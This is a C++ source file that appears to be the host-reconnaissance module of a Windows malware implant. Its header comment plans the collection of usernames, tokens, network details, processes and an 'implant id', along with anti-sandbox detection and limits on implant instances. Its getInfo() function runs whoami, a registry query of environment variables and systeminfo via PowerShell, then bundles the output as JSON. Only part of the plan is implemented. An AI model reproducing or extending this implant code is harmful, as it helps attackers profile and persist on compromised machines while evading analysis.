/*
Situational Awareness TODO list:
* read environment variables
* list the computer's network interfaces
  * collect MAC, IP, interface names
* get Windows version
* get current username and token
* get computer's name
* get the machine's GUID (generate computer_guid aka implant id)
* list files in a directory (?)
* change directory (?)
* list all running processes
* bonus: anti sandbox detection
* limit the number of running implant instances to 3

*/

#include <string>
#include "../libs/nlohmann/json.hpp"
#include "../execution/execution.hpp"
#include "sitawareness.hpp"

using json = nlohmann::json;


std::string getInfo() {
  json j;
  std::string result;

  // i think this covers most of it?
  std::string wmi = "whoami";
  LPSTR whoami =  const_cast<char *>(wmi.c_str());
  j["whoami"] = runProgram(whoami);
  std::string envir = "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\"";
  LPSTR env =  const_cast<char *>(envir.c_str());
  //j["ps"] = runProgram("ps");
  j["env"] = runProgram(env);
  std::string sys_info = "systeminfo /fo CSV | ConvertFrom-Csv | convertto-json";
  LPSTR sys =  const_cast<char *>(sys_info.c_str());
  j["systeminfo"] = runPowershellCommand(sys);

  result = j.dump(4);

  return result;

}